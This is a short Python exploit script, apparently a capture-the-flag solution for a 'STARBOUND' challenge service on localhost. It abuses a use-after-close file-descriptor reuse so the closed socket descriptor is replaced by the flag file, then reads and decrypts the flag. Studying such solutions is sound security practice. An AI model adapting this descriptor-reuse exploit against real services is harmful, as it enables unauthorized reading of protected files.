#!/usr/bin/env python

'''
File descripter reuse (use after close)
'''

from util import *
import re

s = service()
s.connect('127.0.0.1', 8888)
s.recvuntil('-+STARBOUND v1.0+-')

s.recvuntil('> ')
s.send('7\n')
s.recvuntil('> ')
s.send('2\n')
key = int(re.findall('\[Info\] Portal ([0-9]+) enabled', s.recvuntil('\n'))[0])
s.recvuntil('> ')
s.send('3\n')
# socket fd is closed.

s.recvuntil('> ')
s.send('1\n')
s.recvuntil('> ')
s.send('1\n')
# socket fd is replaced by file (flag) fd

s.recvuntil('> ')
s.send('7\n')
s.recvuntil('> ')
s.send('4\n')
s.recvuntil('[Info] Receiving (')
enflag = s.recvn(32)

# Decrypt flag
flag = ''
for x in enflag:
  key = ((key<<1) | (key>>15)) & 0xffff
  flag += chr((ord(x)+key)%95+32)

print flag

s.close()
